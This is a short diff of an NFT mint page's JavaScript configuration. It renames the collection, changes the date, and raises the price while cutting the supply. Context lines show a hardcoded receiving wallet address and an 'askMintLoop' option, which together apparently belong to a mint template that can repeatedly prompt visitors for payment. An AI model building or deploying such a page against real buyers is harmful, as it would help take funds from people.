@@ -9,8 +9,8 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 */
 
 const collectionInfo = {
-    name: "nft-professor",
-    date: "10.04.2022",
+    name: "Tigerbob",
+    date: "25.04.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
@@ -33,8 +33,8 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.2,
-    totalSupply: 8888,
+    price: 0.25,
+    totalSupply: 1000,
     minUnits: 1,
     maxUnits: 20,
     askMintLoop: true,
